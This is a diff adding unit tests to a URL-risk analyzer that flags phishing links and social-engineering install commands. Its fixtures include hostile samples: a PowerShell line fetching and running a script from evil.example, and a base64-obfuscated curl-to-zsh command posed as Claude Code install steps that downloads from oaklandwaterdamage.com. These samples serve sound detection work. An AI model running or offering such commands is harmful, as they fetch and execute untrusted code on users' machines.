@@ -33,6 +33,17 @@ class AnalyzerTests(unittest.TestCase):
         self.assertIn('Contains risky keyword: "login"', result["reasons"])
         self.assertIn("Suspicious TLD: .xyz", result["reasons"])
 
+    def test_safe_browsing_phishing_test_url_is_flagged(self):
+        with patch("link_check.analyzer.get_domain_age", return_value=None), patch(
+            "link_check.analyzer.check_redirect", return_value=(False, [])
+        ), patch("link_check.analyzer.fetch_url_text", return_value=None):
+            result = analyze_url("http://testsafebrowsing.appspot.com/s/phishing.html")
+
+        self.assertEqual(result["score"], 100)
+        self.assertIn("Google Safe Browsing test threat URL", result["reasons"])
+        self.assertIn('URL path/query contains threat term: "phishing"', result["reasons"])
+        self.assertIn("Uses plain HTTP instead of HTTPS", result["reasons"])
+
     def test_new_domain_increases_score(self):
         with patch("link_check.analyzer.get_domain_age", return_value=3), patch(
             "link_check.analyzer.check_redirect", return_value=(False, [])
@@ -88,6 +99,78 @@ class AnalyzerTests(unittest.TestCase):
         self.assertGreaterEqual(result["score"], 70)
         self.assertIn(
             "Social engineering: install command pipes remote script into shell",
+            result["reasons"],
+        )
+
+    def test_official_claude_installer_is_not_social_engineering(self):
+        content = """
+        Native Installer (Recommended)
+        Install Claude Code (macOS / Linux)
+        curl -fsSL https://claude.ai/install.sh | bash
+        Windows PowerShell
+        irm https://claude.ai/install.ps1 | iex
+        """
+
+        with patch("link_check.analyzer.get_domain_age", return_value=None), patch(
+            "link_check.analyzer.check_redirect", return_value=(False, [])
+        ), patch("link_check.analyzer.fetch_url_text", return_value=content):
+            result = analyze_url("https://www.morphllm.com/install-claude-code")
+
+        self.assertEqual(result["score"], 0)
+        self.assertNotIn(
+            "Social engineering: install command pipes remote script into shell",
+            result["reasons"],
+        )
+        self.assertIn("Official installer command from trusted domain", result["reasons"])
+
+    def test_official_claude_powershell_installer_is_not_social_engineering(self):
+        content = "Install Claude Code on Windows with: irm https://claude.ai/install.ps1 | iex"
+
+        with patch("link_check.analyzer.get_domain_age", return_value=None), patch(
+            "link_check.analyzer.check_redirect", return_value=(False, [])
+        ), patch("link_check.analyzer.fetch_url_text", return_value=content):
+            result = analyze_url("https://www.morphllm.com/install-claude-code")
+
+        self.assertEqual(result["score"], 0)
+        self.assertIn("Official installer command from trusted domain", result["reasons"])
+
+    def test_untrusted_powershell_pipe_execution_is_social_engineering(self):
+        content = "Install update: irm http://evil.example/install.ps1 | iex"
+
+        with patch("link_check.analyzer.get_domain_age", return_value=None), patch(
+            "link_check.analyzer.check_redirect", return_value=(False, [])
+        ), patch("link_check.analyzer.fetch_url_text", return_value=content):
+            result = analyze_url("https://example.com")
+
+        self.assertGreaterEqual(result["score"], 70)
+        self.assertIn(
+            "Social engineering: install command pipes remote script into shell",
+            result["reasons"],
+        )
+
+    def test_analyze_url_scans_claude_api_json_content(self):
+        content = """
+        {
+          "messages": [
+            {
+              "content": "How to Install Claude Code. Copy this: curl -kfsSL $(echo 'aHR0cDovL29ha2xhbmR3YXRlcmRhbWFnZS5jb20vY3VybC82NjQ1YmY2MWJkNWM2OWQ4NjkyYzVjN2Q0NTIxYWY2MTQzMTU4ZDI1ZDBiMWI3ZGQyMTNlZjk3NTc2MDJiMzlh'|base64 -D)|zsh"
+            }
+          ]
+        }
+        """
+
+        with patch("link_check.analyzer.get_domain_age", return_value=None), patch(
+            "link_check.analyzer.check_redirect", return_value=(False, [])
+        ), patch("link_check.analyzer.fetch_url_text", return_value=content):
+            result = analyze_url("https://claude.ai/share/example")
+
+        self.assertEqual(result["score"], 100)
+        self.assertIn(
+            "Social engineering: obfuscated base64 payload hides a URL",
+            result["reasons"],
+        )
+        self.assertIn(
+            "Social engineering: install command downloads from untrusted domain: oaklandwaterdamage.com",
             result["reasons"],
         )
 
